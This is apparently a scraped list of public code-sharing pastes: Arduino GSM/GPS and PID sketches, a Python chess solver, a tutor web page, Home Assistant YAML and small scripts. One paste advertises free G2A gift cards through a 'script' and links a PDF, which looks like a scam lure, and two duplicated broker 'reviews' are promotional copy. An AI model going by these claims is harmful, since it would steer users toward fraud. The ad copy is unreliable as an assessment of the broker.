+/****** FUNCTION PROTOTYPES *****/
+void setup(void);
+void loop(void);
+
+/***** DEFINITION OF Hardware Serial *****/
+#define modem Serial2 // TX_PIN: D17, RX_PIN: D16
+
+/***** SYSTEM REQUIREMENT 2 *****/
+#define TINY_GSM_MODEM_SIM7600
+
+/***** SYSTEM REQUIREMENT 1 *****/
+#define TINY_GSM_DEBUG Serial
+
+// Your GPRS credentials
+const char apn[] = ""airtelgprs.com"";
+const char gprsUser[] = """";
+const char gprsPass[] = """";
+
+// Initialize the TinyGSM modem instance
+TinyGsm modem(modem);
+TinyGsmClient client(modem);
+
+void setup(void)
+{
+    // Set console baud rate
+    Serial.begin(115200);
+    delay(10);
+
+    // Set GSM module baud rate
+    modem.begin(115200);
+
+    // Restart takes quite some time
+    // To skip it, call init() instead of restart()
+    Serial.println(""Initializing modem..."");
+    modem.restart();
+
+    // Display modem info
+    String modemInfo = modem.getModemInfo();
+    Serial.print(""Modem Info: "");
+    Serial.println(modemInfo);
+
+    // Unlock your SIM card with a PIN if needed
+    // modem.simUnlock(""1234"");
+
+    // Connect to the GPRS network
+    Serial.print(""Connecting to APN: "");
+    Serial.println(apn);
+    if (!modem.gprsConnect(apn, gprsUser, gprsPass)) {
+        Serial.println(""Failed to connect to GPRS"");
+        while (true);
+    }
+    Serial.println(""GPRS connected"");
+
+    // Enable GNSS
+    Serial.println(""Enabling GNSS..."");
+    modem.enableGPS();
+}
+
+void loop(void)
+{
+    // Check if GNSS is enabled and get location data
+    if (modem.isGPS()) {
+        float lat, lon;
+        if (modem.getGPS(&lat, &lon)) {
+            Serial.print(""Latitude: "");
+            Serial.println(lat, 6);
+            Serial.print(""Longitude: "");
+            Serial.println(lon, 6);
+        } else {
+            Serial.println(""Failed to get GPS data"");
+        }
+    } else {
+        Serial.println(""GNSS is not enabled"");
+    }
+
+    delay(10000); // Wait for 10 seconds before the next loop
+}
+
+/* END CODE */"
+vP9WaBmb,"""PID Positioning"" rev_03",pleasedontcode,Arduino,Monday 24th of June 2024 09:37:18 AM CDT,"/********* Pleasedontcode.com **********
+
+	Pleasedontcode thanks you for automatic code generation! Enjoy your code!
+
+	- Terms and Conditions:
+	You have a non-exclusive, revocable, worldwide, royalty-free license
+	for personal and commercial use. Attribution is optional; modifications
+	are allowed, but you're responsible for code maintenance. We're not
+	liable for any loss or damage. For full terms,
+	please visit pleasedontcode.com/termsandconditions.
+
+	- Project: ""PID Positioning""
+	- Source Code NOT compiled for: Arduino Uno
+	- Source Code created on: 2024-06-24 14:34:47
+
+********* Pleasedontcode.com **********/
+
+/****** SYSTEM REQUIREMENTS *****/
+/****** SYSTEM REQUIREMENT 1 *****/
+	/* Implement Arduino PID control algorithm to */
+	/* maintain ball position within 32 cm beam using */
+	/* Ultrasonic sensor and 360-degree Servo motor. */
+/****** END SYSTEM REQUIREMENTS *****/
+
+/****** DEFINITION OF LIBRARIES *****/
+#include <Ultrasonic.h>  //https://github.com/ErickSimoes/Ultrasonic
+#include <Servo.h>       //https://github.com/arduino-libraries/Servo
+
+/****** FUNCTION PROTOTYPES *****/
+void setup(void);
+void loop(void);
+void updateOutputs(void);
+void computePID(void);
+
+/***** DEFINITION OF DIGITAL INPUT PINS *****/
+const uint8_t Ultrasonic_Sensor_HC_SR04_Echo_PIN_D3 = 3;
+
+/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
+const uint8_t Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2 = 2;
+
+/***** DEFINITION OF PWM OUTPUT PINS *****/
+const uint8_t servo_Servomotor_PWMSignal_PIN_D5 = 5;
+
+/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
+/***** used to store raw data *****/
+bool Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2_rawData = 0;
+uint8_t servo_Servomotor_PWMSignal_PIN_D5_rawData = 0;
+
+/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
+/***** used to store data after characteristic curve transformation *****/
+float Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2_phyData = 0.0;
+float servo_Servomotor_PWMSignal_PIN_D5_phyData = 0.0;
+
+/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
+// Initialize the Ultrasonic sensor object with trigger and echo pins
+Ultrasonic ultrasonic(Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2, Ultrasonic_Sensor_HC_SR04_Echo_PIN_D3);
+
+// Initialize the Servo object
+Servo myservo;
+
+/***** PID CONTROL VARIABLES *****/
+float setPoint = 32.0; // Desired position in cm
+float input, output;
+float Kp = 2.0, Ki = 5.0, Kd = 1.0; // PID constants
+float previousError = 0, integral = 0;
+unsigned long lastTime;
+
+void setup(void)
+{
+    // put your setup code here, to run once:
+    Serial.begin(9600);  // Initialize serial communication for debugging
+
+    pinMode(Ultrasonic_Sensor_HC_SR04_Echo_PIN_D3, INPUT);
+    pinMode(Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2, OUTPUT);
+    pinMode(servo_Servomotor_PWMSignal_PIN_D5, OUTPUT);
+
+    // Attach the servo to the PWM pin
+    myservo.attach(servo_Servomotor_PWMSignal_PIN_D5);
+
+    lastTime = millis();
+}
+
+void loop(void)
+{
+    // put your main code here, to run repeatedly:
+    updateOutputs(); // Refresh output data
+
+    // Read distance from the ultrasonic sensor
+    input = ultrasonic.read();
+    Serial.print(""Distance in CM: "");
+    Serial.println(input);
+
+    // Compute PID control
+    computePID();
+
+    // Map the PID output to a servo position (0 to 180 degrees)
+    int servoPosition = map(output, 0, 100, 0, 180); // Assuming max distance is 100 cm
+    myservo.write(servoPosition); // Set the servo position
+
+    delay(100); // Delay for 100 milliseconds
+}
+
+void updateOutputs()
+{
+    digitalWrite(Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2, Ultrasonic_Sensor_HC_SR04_Trigger_PIN_D2_rawData);
+    analogWrite(servo_Servomotor_PWMSignal_PIN_D5, servo_Servomotor_PWMSignal_PIN_D5_rawData);
+}
+
+void computePID()
+{
+    unsigned long now = millis();
+    double timeChange = (double)(now - lastTime);
+
+    // Calculate error
+    float error = setPoint - input;
+
+    // Integral term
+    integral += (error * timeChange);
+
+    // Derivative term
+    float derivative = (error - previousError) / timeChange;
+
+    // PID output
+    output = Kp * error + Ki * integral + Kd * derivative;
+
+    // Remember variables for next loop
+    previousError = error;
+    lastTime = now;
+}
+
+/* END CODE */"
+WEpHw11q,tisk reverse optimal ascii boards very good OK,max2201111,Python,Monday 24th of June 2024 09:29:09 AM CDT,"import chess
+import time
+from itertools import permutations, combinations
+from functools import lru_cache
+
+@lru_cache(maxsize=None)
+def simplify_fen_string(fen):
+    parts = fen.split(' ')
+    simplified_fen = ' '.join(parts[:4])  # Zachováváme pouze informace o pozici
+    return simplified_fen
+
+def print_board(fen):
+    board = chess.Board(fen)
+    print(board)
+
+# Startovní pozice
+start_fen = ""8/6P1/8/8/8/k1K5/8/8 w - - 0 1""
+simplified_POZ2 = simplify_fen_string(start_fen)
+POZ = {1: simplified_POZ2}
+
+AR = {simplify_fen_string(start_fen): {'used': 0, 'to_end': None}}
+N = 1
+M = 0
+
+start_time = time.time()
+
+def format_elapsed_time(elapsed_time):
+    hours, remainder = divmod(elapsed_time, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    return f""{int(hours)}h {int(minutes)}m {int(seconds)}s""
+
+def print_elapsed_time(total_time, level_time):
+    print(f""{format_elapsed_time(total_time)} / {format_elapsed_time(level_time)}"")
+
+while M < N:
+    M += 1
+    current_fen = POZ[M]
+    board = chess.Board(current_fen)
+    simplified_current_fen = current_fen
+
+    if AR[simplified_current_fen]['used'] == 0:
+        AR[simplified_current_fen]['used'] = 1
+        for move in board.legal_moves:
+            # Check if the move is a promotion
+            if board.is_pseudo_legal(move) and move.promotion:
+                move.promotion = chess.QUEEN  # Set promotion to queen only
+
+            board.push(move)
+            POZ2 = board.fen()
+            simplified_POZ2 = simplify_fen_string(POZ2)
+
+            if simplified_POZ2 not in AR:
+                AR[simplified_POZ2] = {'used': None, 'to_end': None}
+
+            if AR[simplified_POZ2]['used'] is None:
+                N += 1
+                POZ[N] = simplified_POZ2
+                AR[simplified_POZ2] = {'used': 0, 'to_end': None}
+
+            board.pop()  # Vrátíme tah zpět
+
+print(f""Počet pozic je {N}"")
+
+# Přidání kontroly pro mat, remízu a výchozí hodnotu
+F = 0
+for i in range(1, N + 1):
+    current_fen = POZ[i]
+    board = chess.Board(current_fen)
+    simplified_current_fen = simplify_fen_string(current_fen)
+
+    if board.is_checkmate():
+        AR[simplified_current_fen]['to_end'] = -1000
+        F += 1
+    elif board.is_stalemate() or board.is_insufficient_material() or board.is_seventyfive_moves() or board.is_fivefold_repetition():
+        AR[simplified_current_fen]['to_end'] = 0
+    else:
+        AR[simplified_current_fen]['to_end'] = 0
+
+print(f""Počet pozic v matu je {F}"")
+
+uroven = 0
+while F > 0:
+    uroven += 1
+    level_start_time = time.time()
+    print(f""Výpočet v úrovni {uroven}"")
+    
+    F = 0
+    current_level_positions = 0
+    for i in range(1, N + 1):
+        current_fen = POZ[i]
+        board = chess.Board(current_fen)
+        simplified_current_fen = simplify_fen_string(current_fen)
+        if AR[simplified_current_fen]['to_end'] == 0:
+            hod = -2000
+            for move in board.legal_moves:
+                # Check if the move is a promotion
+                if board.is_pseudo_legal(move) and move.promotion:
+                    move.promotion = chess.QUEEN  # Set promotion to queen only
+
+                board.push(move)
+                POZ2 = board.fen()
+                simplified_POZ2 = simplify_fen_string(POZ2)
+                hod2 = -AR[simplified_POZ2]['to_end']
+                if hod2 > hod:
+                    hod = hod2
+                board.pop()  # Vrátíme tah zpět
+            if hod == 1001 - uroven:
+                AR[simplified_current_fen]['to_end'] = 1000 - uroven
+                F += 1
+                current_level_positions += 1
+            if hod == -1001 + uroven:
+                AR[simplified_current_fen]['to_end'] = -1000 + uroven
+                F += 1
+                current_level_positions += 1
+    level_end_time = time.time()
+    total_elapsed_time = level_end_time - start_time
+    level_elapsed_time = level_end_time - level_start_time
+    print(f""Nalezeno {current_level_positions} pozic v úrovni {uroven}"")
+    print_elapsed_time(total_elapsed_time, level_elapsed_time)
+
+print(f""Nalezeno {F} pozic celkem"")
+
+# Výpis všech pozic s to_end == 21
+print(""Pozice s to_end == 17:"")
+for fen, data in AR.items():
+    if data['to_end'] < 983 and data['to_end'] > 0 and False:
+        print(f""{fen} -> to_end: {data['to_end']}"")
+        
+print(""*****"")
+
+print(""Pozice s to_end == -20:"")
+for fen, data in AR.items():
+    if data['to_end'] > -981 and data['to_end'] < 0 and False:
+        print(f""{fen} -> to_end: {data['to_end']}"")
+
+current_fen = POZ[1]
+board = chess.Board(current_fen)
+simplified_current_fen = simplify_fen_string(current_fen)
+hod = AR[simplified_current_fen]['to_end']
+print(f""Hodnocení počáteční pozice je {hod}"")
+
+# Závěrečný kód pro procházení nejlepších tahů
+current_fen = start_fen
+simplified_current_fen = simplify_fen_string(current_fen)
+
+optimal_moves = []
+while AR[simplified_current_fen]['to_end'] > -1000:
+    board = chess.Board(current_fen)
+    simplified_current_fen = simplify_fen_string(current_fen)
+    hod = -2000
+    for move in board.legal_moves:
+        # Check if the move is a promotion
+        if board.is_pseudo_legal(move) and move.promotion:
+            move.promotion = chess.QUEEN  # Set promotion to queen only
+
+        board.push(move)
+        POZ2 = board.fen()
+        simplified_POZ2 = simplify_fen_string(POZ2)
+        hod2 = -AR[simplified_POZ2]['to_end']
+        if hod2 > hod:
+            hod = hod2
+            best_fen = simplified_POZ2
+        board.pop()  # Vrátíme tah zpět
+
+    optimal_moves.append(best_fen)
+    current_fen = best_fen
+    simplified_current_fen = simplify_fen_string(current_fen)
+
+# Tisk šachovnic v opačném pořadí
+for fen in reversed(optimal_moves):
+    print_board(fen)
+    print(""\n"")
+"
+vm5RwdZm,🤑 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🤑,x2w,GetText,Monday 24th of June 2024 09:24:46 AM CDT,"G2A.com free gift card & games updated guide
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+
+This is the most up to date version of this script. Any other one posted will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
+
+Working as of:
+24 June 2024"
+1cGCXvJ0,"""EasyButton Integration"" rev_04",pleasedontcode,Arduino,Monday 24th of June 2024 09:23:35 AM CDT,"/********* Pleasedontcode.com **********
+
+	Pleasedontcode thanks you for automatic code generation! Enjoy your code!
+
+	- Terms and Conditions:
+	You have a non-exclusive, revocable, worldwide, royalty-free license
+	for personal and commercial use. Attribution is optional; modifications
+	are allowed, but you're responsible for code maintenance. We're not
+	liable for any loss or damage. For full terms,
+	please visit pleasedontcode.com/termsandconditions.
+
+	- Project: ""EasyButton Integration""
+	- Source Code NOT compiled for: Arduino Nano ESP32
+	- Source Code created on: 2024-06-24 14:22:42
+
+********* Pleasedontcode.com **********/
+
+/****** SYSTEM REQUIREMENTS *****/
+/****** SYSTEM REQUIREMENT 1 *****/
+	/* Implement a push-button control system using */
+	/* EasyButton library to detect button presses on */
+	/* digital pin D2. The system should initialize the */
+	/* button in setup() and continuously check for */
+	/* button state changes in loop(). */
+/****** END SYSTEM REQUIREMENTS *****/
+
+/****** DEFINITION OF LIBRARIES *****/
+#include <EasyButton.h>  //https://github.com/evert-arias/EasyButton
+
+/****** FUNCTION PROTOTYPES *****/
+void setup(void);
+void loop(void);
+
+/***** DEFINITION OF DIGITAL INPUT PINS *****/
+const uint8_t butt_PushButton_PIN_D2 = 2;
+
+/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
+EasyButton button(butt_PushButton_PIN_D2); // Initialize EasyButton object with the pin number
+
+/****** FUNCTION DECLARATIONS *****/
+void onPressed(); // Function to handle button press event
+
+void setup(void)
+{
+  // Initialize serial communication at 115200 baud rate
+  Serial.begin(115200); 
+  Serial.println();
+  Serial.println("">>> EasyButton pressed example <<<"");
+
+  // Initialize the button
+  button.begin(); 
+  // Attach the onPressed function to the button press event
+  button.onPressed(onPressed); 
+}
+
+void loop(void)
+{
+  // Continuously read the button state
+  button.read(); 
+}
+
+void onPressed()
+{
+  // Print message when button is pressed
+  Serial.println(""Button pressed""); 
+}
+
+/* END CODE */"
+844XCrDq,Untitled,RenSafaray,CSS,Monday 24th of June 2024 09:21:05 AM CDT,"/* Обнуление отступов и рамки боксовой модели для всех элементов */
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+/* Шрифт и межстрочный интервал для всего документа */
+body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+}
+
+/* Общие стили для контейнеров флексбоксов */
+.container {
+    display: flex;
+    flex-wrap: wrap;
+}
+
+/* Стили для шапки сайта */
+header {
+    background-color: #333;
+    padding: 20px;
+    text-align: center;
+}
+
+/* Стили для заголовка первого уровня в шапке */
+header h1 {
+    margin: 0;
+    color: #fff;
+}
+
+/* Стили для меню навигации */
+nav {
+    background-color: #555;
+    padding: 10px;
+}
+
+/* Стили для контейнера меню навигации */
+nav .container {
+    justify-content: space-around;
+}
+
+/* Стили для ссылок в меню навигации */
+nav a {
+    color: #fff;
+    padding: 5px;
+    text-decoration: none;
+}
+
+/* Стили для ссылок в меню навигации при наведении на них */
+nav a:hover {
+    background-color: #777;
+}
+
+/* Стили для основного контента */
+main {
+    padding: 20px;
+}
+
+/* Стили для секций основного контента */
+main section {
+    width: 100%;
+    margin-bottom: 20px;
+}
+
+/* Стили для изображения */
+main img {
+    max-width: 100%;
+    height: auto;
+}
+
+/* Стили для видео */
+main iframe {
+    position: absolute;
+    width: 100%;
+    height: 56.25%;
+}
+
+main section:position {
+    position: relative;
+    padding-bottom: 56.25%;
+    height: 0;
+}
+
+/* Стили для подвала сайта */
+footer {
+    background-color: #333;
+    color: #fff;
+    text-align: center;
+    padding: 10px;
+}
+
+/* Адаптивная верстка для экранов шириной до 600px */
+@media (max-width: 600px) {
+    /* Стили для меню навигации на экранах шириной до 600px */
+    nav .container {
+        flex-direction: column;
+    }
+}
+/* Стили для контейнера видео */
+.video-container {
+    position: relative;
+    padding-bottom: 56.25%; /* Соотношение сторон 16:9 */
+    height: 0;
+    overflow: hidden;
+}
+/* Стили для видео в контейнере */
+.video-container iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}"
+Xbuzy471,Untitled,RenSafaray,HTML,Monday 24th of June 2024 09:20:40 AM CDT,"<!DOCTYPE html>
+<html lang=""ru"">
+<head>
+    <meta charset=""UTF-8"">
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
+    <title>Репетитор по математике</title>
+    <link rel=""stylesheet"" type=""text/css"" href=""styles.css"">
+</head>
+<body>
+    <!-- Шапка сайта -->
+    <header>
+        <h1>Репетитор по математике</h1>
+    </header>
+
+    <!-- Меню навигации -->
+    <nav>
+        <div class=""container"">
+            <a href=""#services"">Услуги</a>
+            <a href=""#prices"">Цены</a>
+            <a href=""#advantages"">Преимущества</a>
+            <a href=""#contact"">Контакты</a>
+        </div>
+    </nav>
+
+    <!-- Основной контент сайта -->
+    <main>
+        <!-- Секция ""Услуги"" -->
+        <section id=""services"">
+            <h2>Услуги</h2>
+            <p>Предлагаю услуги репетитора по математике для учеников 5-11 классов. Занятия проходят в удобное для вас время и место. Индивидуальный подход к каждому ученику.</p>
+            <img src=""https://edu-inform.ru/upload/iblock/a61/o3hn45ktjbmofu4nm8lxz1fmjiovfmuv.jpg"" alt=""Услуги репетитора по математике"">
+        </section>
+
+        <!-- Секция ""Цены"" -->
+        <section id=""prices"">
+            <h2>Цены</h2>
+            <p>Цена одного занятия - 1000 рублей в час. Скидка при оплате 10 и более занятий.</p>
+        </section>
+
+        <!-- Секция ""Преимущества"" -->
+        <section id=""advantages"">
+            <h2>Преимущества занятий с репетитором по математике</h2>
+            <ul>
+                <li>Индивидуальный подход к каждому ученику</li>
+                <li>Углубленное изучение материала</li>
+                <li>Повышение уверенности в себе</li>
+                <li>Подготовка к экзаменам и тестам</li>
+                <li>Возможность задавать вопросы и получать ответы на них</li>
+            </ul>
+            <!-- Контейнер для видео -->
+            <div class=""video-container"">
+                <iframe src=""https://www.youtube.com/embed/nrUHrqmf2T0"" title=""10 минут, чтобы узнать о профессии репетитор по математике"" frameborder=""0"" allow=""accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"" allowfullscreen></iframe>
+              </div>
+        </section>
+
+        <!-- Секция ""Контакты"" -->
+        <section id=""contact"">
+            <h2>Контакты</h2>
+            <p>Свяжитесь со мной по телефону 8-800-555-35-35 или по электронной почте <a href=""mailto:math@tutor.ru"">math@tutor.ru</a>.</p>
+        </section>
+    </main>
+
+    <!-- Подвал сайта -->
+    <footer>
+        &copy; 2024 Репетитор по математике
+    </footer>
+</body>
+</html>"
+rH5eJ8iL,Review Sage FX,fxvnpro,PHP,Monday 24th of June 2024 08:49:30 AM CDT,"https://www.fxvnpro.com/review-sage-fx/
+ 
+Devoted to providing a client-first service, our mission is to have transparency, technology and trust at the heart of our trading platform. With a team of trading and fintech veterans, Sage FX aims to provide the best possible trading environment and bring all traders peace of mind.
+
+
+
+At Sage FX, we know what it is like to trade.
+
+
+
+We accomplish our mission by sticking to our core values. We place trust and consistency at the heart of what we do and are dedicated to adding value through our unparalleled trading features.
+
+
+
+We sought out a team and business partners in sync with these values, to ensure traders have access to quick, 24/7 support. With 50+ years of industry participation we can guarantee that our diverse team and expertise will provide the trading experience you deserve.
+
+
+
+Broker Logo &nbsp;
+
+
+
+BROKER INFORMATION
+
+
+
+Broker TypeN/ACompanySeager LimitedFoundation2020CountryMarshall IslandsRegulation&nbsp;Company Number 118340Minimum Initial Deposit$10Account Base CurrenciesUSD, EURAccount Deposit Methods- Crypto - Bitcoin (BTC), Ethereum (ETH), Ripple (XRP), Litecoin (LTC),Dogecoin (DOGE), or Tether (USDT)- Visa, Master Cards, Wire Transfer, VloadAccount Withdrawal Methods- Crypto - Bitcoin (BTC), Ethereum (ETH), Ripple (XRP), Litecoin (LTC),Dogecoin (DOGE), or Tether (USDT)- Visa, Master Cards, Wire Transfer, VloadLive ChatYesEmailSubmit a ticket
+
+
+
+ADVANTAGES
+
+
+
+Free Demo AccountYesSpreadsRaw spreads from 0.1 pipsExecution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeNoPromotionsNoVirtual Private ServerNoTrading PlatformsTradeLockerScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Crypto, Indices &amp; Commodities
+
+
+
+DISADVANTAGES
+
+
+
+RestrictionsThe website is not intended for distribution to, or use by, any person in any country orthe jurisdiction where such distribution or use would be contrary to local law.
+"
+Urbt3xbj,Review Sage FX,reviewbrokers,PHP,Monday 24th of June 2024 08:49:17 AM CDT,"https://www.reviewbrokers.net/review-sage-fx/
+ 
+Devoted to providing a client-first service, our mission is to have transparency, technology and trust at the heart of our trading platform. With a team of trading and fintech veterans, Sage FX aims to provide the best possible trading environment and bring all traders peace of mind.
+
+
+
+At Sage FX, we know what it is like to trade.
+
+
+
+We accomplish our mission by sticking to our core values. We place trust and consistency at the heart of what we do and are dedicated to adding value through our unparalleled trading features.
+
+
+
+We sought out a team and business partners in sync with these values, to ensure traders have access to quick, 24/7 support. With 50+ years of industry participation we can guarantee that our diverse team and expertise will provide the trading experience you deserve.
+
+
+
+Broker Logo &nbsp;
+
+
+
+
+
+
+
+Broker TypeN/ACompanySeager LimitedFoundation2020CountryMarshall IslandsRegulation&nbsp;Company Number 118340The JurisdictionsThe website is not intended for distribution to, or use by, any person in any country orthe jurisdiction where such distribution or use would be contrary to local law.Live ChatYesEmailSubmit a ticket
+
+
+
+
+
+
+
+Free Demo AccountsYesMinimum Initial Deposit$10Multi-Currency AccountUSD, EUR, GBPSpreadsRaw spreads from 0.1 pipsIntroducing Brokers ProgramYesSwap FreeNoPromotionsNoVirtual Private ServerNoTrading PlatformsTradeLockerScalpingYesHedgingYesExpert AdvisorsYesAccount Funding Methods- Crypto - Bitcoin (BTC), Ethereum (ETH), Ripple (XRP), Litecoin (LTC),Dogecoin (DOGE), or Tether (USDT)- Visa, Master Cards, Wire Transfer, Vload
+"
+fH1if6j0,Room Card,CollotsSpot,YAML,Monday 24th of June 2024 08:48:08 AM CDT,"type: custom:button-card
+entity: media_player.bedroom_hifi
+show_entity_picture: true
+show_name: false
+show_icon: false
+custom_fields:
+  info:
+    card:
+      type: vertical-stack
+      cards:
+        - type: custom:button-card
+          entity: sensor.bedroom_content
+          name: >
+            [[[return
+            `<marquee>${states['media_player.bedroom_hifi'].attributes.media_artist}
+            <\marquee>`]]]
+          show_label: true
+          show_icon: false
+          state:
+            - value: radio
+              styles:
+                name:
+                  - color: rgba(0,0,0,0)
+          styles:
+            card:
+              - box-shadow: none
+              - background: none
+              - padding: 0px
+              - border-radius: 0px
+              - margin-bottom: '-15px'
+            name:
+              - justify-self: stretch
+              - font-size: 24px
+              - font-weight: bold
+              - color: var(--primary-color)
+        - type: custom:button-card
+          entity: sensor.bedroom_content
+          name: >
+            [[[return
+            `<marquee>${states['media_player.bedroom_hifi'].attributes.media_album_name}
+            <\marquee>`]]]
+          show_icon: false
+          state:
+            - value: radio
+              styles:
+                name:
+                  - color: rgba(0,0,0,0)
+          styles:
+            card:
+              - box-shadow: none
+              - background: none
+              - padding: 0px
+              - border-radius: 0px
+              - margin-bottom: '-13px'
+            name:
+              - justify-self: stretch
+              - font-size: 19px
+              - font-weight: 500
+              - color: rgba(96,114,116,0.6)
+        - type: custom:button-card
+          entity: sensor.bedroom_content
+          name: >
+            [[[return
+            `<marquee>${states['media_player.bedroom_hifi'].attributes.media_title}
+            <\marquee>`]]]
+          show_icon: false
+          state:
+            - value: radio
+              styles:
+                name:
+                  - font-size: 24px
+                  - margin-top: '-4px'
+          styles:
+            card:
+              - box-shadow: none
+              - background: none
+              - padding: 0px
+              - border-radius: 0px
+            name:
+              - justify-self: stretch
+              - font-size: 19px
+              - font-weight: 500
+              - color: var(--primary-color)
+  previous:
+    card:
+      type: custom:button-card
+      tap_action:
+        action: call-service
+        service: media_player.media_previous_track
+        target:
+          entity_id: media_player.bedroom_hifi
+      icon: mdi:skip-previous
+      show_name: false
+      styles:
+        card:
+          - width: 33px
+          - height: 33px
+          - border-radius: 99px
+          - box-shadow: none
+          - background: var(--button-background-color)
+        icon:
+          - width: 26px
+          - color: var(--primary-color)
+  play:
+    card:
+      type: custom:button-card
+      tap_action:
+        action: call-service
+        service: media_player.media_play_pause
+        target:
+          entity_id: media_player.bedroom_hifi
+      hold_action:
+        action: call-service
+        service: media_player.turn_off
+        target:
+          entity_id:
+            - media_player.bedroom_hifi
+      entity: media_player.bedroom_hifi
+      icon: mdi:play
+      state:
+        - value: playing
+          icon: mdi:pause
+      show_name: false
+      styles:
+        card:
+          - width: 33px
+          - height: 33px
+          - border-radius: 99px
+          - box-shadow: none
+          - background: var(--button-background-color)
+        icon:
+          - width: 26px
+          - color: var(--primary-color)
+  next:
+    card:
+      type: custom:button-card
+      tap_action:
+        action: call-service
+        service: media_player.media_next_track
+        target:
+          entity_id: media_player.bedroom_hifi
+      icon: mdi:skip-next
+      show_name: false
+      styles:
+        card:
+          - width: 33px
+          - height: 33px
+          - border-radius: 99px
+          - box-shadow: none
+          - background: var(--button-background-color)
+        icon:
+          - width: 26px
+          - color: var(--primary-color)
+  volumedown:
+    card:
+      type: custom:button-card
+      tap_action:
+        action: call-service
+        service: media_player.volume_down
+        target:
+          entity_id:
+            - media_player.bedroom_hifi
+      icon: mdi:volume-medium
+      show_name: false
+      styles:
+        card:
+          - width: 33px
+          - height: 33px
+          - border-radius: 99px
+          - box-shadow: none
+          - background: var(--button-background-color)
+        icon:
+          - width: 26px
+          - color: var(--primary-color)
+  volumeup:
+    card:
+      type: custom:button-card
+      tap_action:
+        action: call-service
+        service: media_player.volume_up
+        target:
+          entity_id:
+            - media_player.bedroom_hifi
+      icon: mdi:volume-high
+      show_name: false
+      styles:
+        card:
+          - width: 33px
+          - height: 33px
+          - border-radius: 99px
+          - box-shadow: none
+          - background: var(--button-background-color)
+        icon:
+          - width: 24px
+          - color: var(--primary-color)
+  wiki:
+    card:
+      type: custom:config-template-card
+      variables:
+        album_url: states['sensor.album_wiki_bedroom'].state
+      entities:
+        - sensor.album_wiki_bedroom
+      card:
+        type: custom:button-card
+        entity: sensor.album_wiki
+        icon: mdi:magnify
+        show_name: false
+        tap_action:
+          action: url
+          url_path: ${album_url}
+        styles:
+          icon:
+            - width: 22px
+            - color: var(--primary-color)
+          card:
+            - width: 33px
+            - height: 33px
+            - border-radius: 99px
+            - box-shadow: none
+            - background: var(--button-background-color)
+styles:
+  grid:
+    - grid-template-areas: '""i info"" ""i buttons""'
+    - grid-template-columns: max-content 1fr
+    - grid-template-rows: min-content min-content
+  card:
+    - background: none
+    - box-shadow: none
+    - border-radius: 0px
+    - padding: 0 0px 0 0px
+    - margin: 10px 0 0px 7px
+  custom_fields:
+    previous:
+      - position: absolute
+      - bottom: 0%
+      - left: 28%
+      - margin: 0 0 0 14px
+      - justify-self: start
+    play:
+      - position: absolute
+      - bottom: 0%
+      - left: 39.2%
+      - margin: 0 0 0 14px
+      - justify-self: start
+    next:
+      - position: absolute
+      - bottom: 0%
+      - left: 50.4%
+      - margin: 0 0 0 14px
+      - justify-self: start
+    volumedown:
+      - position: absolute
+      - bottom: 0%
+      - left: 61.6%
+      - margin: 0 0 0 14px
+      - justify-self: start
+    volumeup:
+      - position: absolute
+      - bottom: 0%
+      - left: 72.8%
+      - margin: 0 0 0 14px
+      - justify-self: start
+    wiki:
+      - position: absolute
+      - bottom: 0%
+      - left: 84%
+      - margin: 0 0 0 14px
+      - justify-self: start
+  entity_picture:
+    - width: 110px
+    - height: 110px
+    - border-radius: 15px
+"
+Sc1vvQdH,status_bar duration,horozov86,Python,Monday 24th of June 2024 08:44:03 AM CDT,"status_bar = Label(root, text="""", bd=1, relief=GROOVE, anchor=E)
+status_bar.pack(fill=X, side=BOTTOM, ipady=2)
+
+
+def play_time():
+    current_time = pygame.mixer.music.get_pos() / 1000
+    
+    converted_current_time = time.strftime(""%M:%S"", time.gmtime(current_time))
+    
+    current_song = song_box.curselection()
+    
+    song = song_box.get(current_song)
+    
+    song = f""C:/gui/audio/{song}.mp3""
+    
+    song_mut = MP3(song)
+    
+    song_length = song_mut.info.length
+    
+    converted_song_length = time.strftime(""%M:%S"", time.gmtime(song_length))
+    
+    status_bar.config(text=f""Time Elapsed: {converted_current_time} of {converted_song_length}  "")
+    
+    status_bar.after(1000, play_time)
+    
+# В края на функцията stop добави
+# status_bar.config(text="""")
+
+# и промени song = song_box.get(current_song) на song = song_box.get(ACTIVE)"
+0FpZ0Xi8,DefinedAreaLevelRemover,problemlow,Lua,Monday 24th of June 2024 08:35:01 AM CDT,"function lineR()
+    moved = true
+    while moved == true do
+        turtle.digDown()
+        moved = turtle.forward()
+        turtle.digDown()
+    end
+    turtle.turnRight()
+    turtle.forward()
+    turtle.turnLeft()
+    moved = true
+    while moved == true do
+        turtle.digDown()
+        moved = turtle.forward()
+        turtle.digDown()
+    end
+    turtle.turnLeft()
+    turtle.turnLeft()
+end
+
+
+function lineL()
+    moved = true
+    while moved == true do
+        turtle.digDown()
+        moved = turtle.forward()
+        turtle.digDown()
+    end
+    turtle.turnLeft()
+    turtle.forward()
+    turtle.turnRight()
+    moved = true
+    while moved == true do
+        turtle.digDown()
+        moved = turtle.forward()
+        turtle.digDown()
+    end
+    turtle.turnLeft()
+    turtle.turnLeft()
+end
+
+while true do
+    lineR()
+    lineL()
+end"
